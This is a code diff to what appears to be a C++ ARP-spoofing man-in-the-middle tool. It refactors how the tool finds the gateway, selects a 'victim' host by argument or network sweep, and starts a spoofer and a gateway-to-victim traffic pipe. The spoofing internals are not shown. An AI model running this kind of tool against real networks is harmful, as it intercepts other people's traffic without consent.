@@ -55,9 +55,6 @@ static void parseProgramArguments(int argc, char* argv[]){
 			i++;
 		} else if(arg == "-V" || arg == "--victim"){
 			Globals::victim.setIP(argv[i+1]);
-			printf("IP %s\n", Host::ipToString(Globals::victim.ip).c_str());
-			Sweeper::findHostMAC(&Globals::victim);
-			Globals::victim.toString();
 			i++;
 		} else{
 			printf("Unrecognized argument: %s\n", argv[i]);
@@ -133,40 +130,48 @@ int main(int argc, char* argv[]){
 	if(Globals::iface == NULL){
 		selectInterface();
 	}
-
 	if(Globals::verbose)
 		printf("Inteface selected: %s\n", Globals::iface);
 
 	Globals::findAttacker();
+
 	Globals::findGateway();
-
-	if(Globals::verbose){
-		printf("Your machine -> ");
-		Globals::attacker.toString();
-	}
-
-	Sweeper sweeper;
-	vector<Host>& avaiableHosts = sweeper.sweep();
-	if(avaiableHosts.size() == 0){
-		printf("No hosts on the net besides you. Exiting...\n");
+	Sweeper::findHostMAC(&Globals::gateway);
+	Globals::gateway.setName("Gateway");
+	if(!Host::isDefined(Globals::gateway)){
+		printf("Can't find gateway. Exiting ...\n");
 		exit(EXIT_SUCCESS);
 	}
 
-	if(!Globals::gateway.ip || !Globals::gateway.mac){
-		printf("Gateway could not be found, select one below:\n\n");
-		Globals::gateway = selectVictim(avaiableHosts);
-		Globals::gateway.setName("Gateway");
+	Globals::victim.setName("Victim");
+	if(!Globals::victim.ip){
+		Sweeper sweeper;
+		vector<Host>& avaiableHosts = sweeper.sweep();
+		if(avaiableHosts.size() == 0){
+			fprintf(stderr, "No hosts on the net besides you. Exiting...\n");
+			exit(EXIT_SUCCESS);
+		}
+		Globals::victim = selectVictim(avaiableHosts);
+		Globals::victim.setName("Victim");
+	} else {
+		Sweeper::findHostMAC(&Globals::victim);
+		if(!Host::isDefined(&Globals::victim)){
+			fprintf(stderr, "Can't find victim. Exiting ...\n");
+			exit(EXIT_SUCCESS);
+		}
 	}
 
-	Globals::victim = selectVictim(avaiableHosts);
-	Globals::victim.setName("Victim");
+	if(Globals::verbose){
+		Globals::attacker.toString();
+		Globals::gateway.toString();
+		Globals::victim.toString();
+	}
 
 	Spoofer spoofer;
 	spoofer.init();
 
 	Pipe gateway2victim(Globals::gateway, Globals::victim);
 	gateway2victim.init();
-	printf("Pipe 1 concluido\n");
 
 	//Pipe victim2gateway(Globals::victim, Globals::gateway);
 	//victim2gateway.init();
